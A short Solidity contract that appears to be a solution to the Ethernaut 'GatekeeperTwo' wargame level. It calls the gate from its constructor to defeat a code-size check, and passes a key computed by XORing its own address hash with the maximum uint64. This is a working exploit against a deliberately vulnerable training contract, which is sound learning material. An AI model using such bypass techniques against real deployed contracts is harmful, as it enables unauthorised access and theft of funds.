// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { GatekeeperTwo} from "../Instances/GateKeeperTwo.sol";

contract Gate2 {
    GatekeeperTwo public gate2 = GatekeeperTwo(0x2f34316cE54cfE1eB4B2599644D9166Ad1f7418C);

    constructor()  {
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  type(uint64).max);
    gate2.enter(key);
    }

}